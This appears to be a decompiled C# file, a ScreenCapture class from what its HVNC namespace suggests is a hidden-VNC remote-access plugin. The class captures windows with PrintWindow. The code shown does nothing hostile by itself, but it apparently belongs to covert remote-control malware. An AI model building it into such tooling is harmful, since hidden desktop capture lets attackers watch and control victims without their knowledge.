using System;
using System.Drawing;
using System.Runtime.InteropServices;
using HVNC;

namespace S;

internal class ScreenCapture
{
	private class User32
	{
		public struct Rect
		{
			public int left;

			public int top;

			public int right;

			public int bottom;
		}

		[DllImport("user32.dll")]
		public static extern IntPtr GetWindowRect(IntPtr hWnd, ref Rect rect);

		[DllImport("user32.dll")]
		public static extern bool PrintWindow(IntPtr hwnd, IntPtr hdcBlt, uint nFlags);
	}

	public Bitmap CaptureWindow(IntPtr handle)
	{
		User32.Rect rect = default(User32.Rect);
		User32.GetWindowRect(handle, ref rect);
		int num = rect.right - rect.left;
		int num2 = rect.bottom - rect.top;
		Bitmap bitmap = new Bitmap(num + 1, num2 + 1);
		using (Graphics graphics = Graphics.FromImage(bitmap))
		{
			IntPtr hdc = graphics.GetHdc();
			if (HVNC.Plugin.Helper.HigherThan81)
			{
				User32.PrintWindow(handle, hdc, 2u);
			}
			else
			{
				User32.PrintWindow(handle, hdc, 0u);
			}
		}
		return bitmap;
	}
}
